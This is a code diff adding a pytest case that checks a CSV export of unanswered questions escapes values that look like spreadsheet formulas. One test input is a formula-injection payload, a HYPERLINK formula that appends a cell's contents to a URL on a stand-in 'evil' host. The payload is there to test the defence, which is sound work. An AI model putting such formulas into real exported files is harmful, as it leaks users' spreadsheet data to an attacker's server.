@@ -47,3 +47,14 @@ def test_questions_are_grouped_counted_and_redacted(db_session):
 def test_days_must_be_positive(db_session):
     with pytest.raises(ValueError):
         group_unanswered(db_session, days=0)
+
+
+def test_a_question_that_looks_like_a_formula_is_exported_as_text(db_session):
+    add(db_session, '=HYPERLINK("http://evil/?"&A1,"x")')
+    add(db_session, "@SUM(A1:A2)")
+
+    output = io.StringIO()
+    write_csv(group_unanswered(db_session, days=30, now=NOW), output)
+    questions = [row["question"] for row in csv.DictReader(io.StringIO(output.getvalue()))]
+
+    assert all(question.startswith("'") for question in questions)
